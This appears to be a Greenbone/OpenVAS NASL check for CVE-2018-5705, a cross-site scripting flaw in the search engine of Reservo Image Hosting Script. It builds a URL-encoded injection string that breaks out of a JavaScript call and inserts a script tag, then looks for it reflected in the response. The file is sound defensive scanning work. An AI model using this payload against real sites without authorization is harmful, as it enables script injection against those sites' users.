# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113086");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2018-01-18 10:46:47 +0100 (Thu, 18 Jan 2018)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-02-09 17:55:00 +0000 (Fri, 09 Feb 2018)");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2018-5705");

  script_name("Reservo Image Hosting Script < 1.6.1 XSS Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_reservo_detect.nasl");
  script_mandatory_keys("reservo/installed");

  script_tag(name:"summary", value:"Reservo Image Hosting Script is prone to a cross-site scripting
  (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists within the software's search engine.");

  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to trick other
  users to execute malicious code in their context.");

  script_tag(name:"affected", value:"Reservo Image Hosting Script through version 1.5.");

  script_tag(name:"solution", value:"Update to version 1.6.1 or later.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/43676/");

  exit(0);
}

CPE = "cpe:/a:reservo:image_hosting";

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

if( ! port = get_app_port( cpe: CPE, service: "www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe: CPE, port: port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

timestamp = gettimeofday();
url = dir + "/search/?s=image&t=%27%29%3B%2522%2520style%253D%22%3Cscript%3Ealert%28" + timestamp + "%29%3C%2Fscript%3E%3C";
req = http_get( port: port, item: url );
res = http_keepalive_send_recv( port: port, data: req );

if( res =~ 'loadBrowsePageRecentImages\\(.+\\);%22%20style%3D<script>alert\\(' + timestamp + '\\)</script>' ||
    res =~ 'loadBrowsePageAlbums\\(.+\\);%22%20style%3D<script>alert\\(' + timestamp + '\\)</script>' ) {
  report = http_report_vuln_url( port: port, url: url );
  security_message( port: port, data: report );
  exit( 0 );
}

exit( 99 );
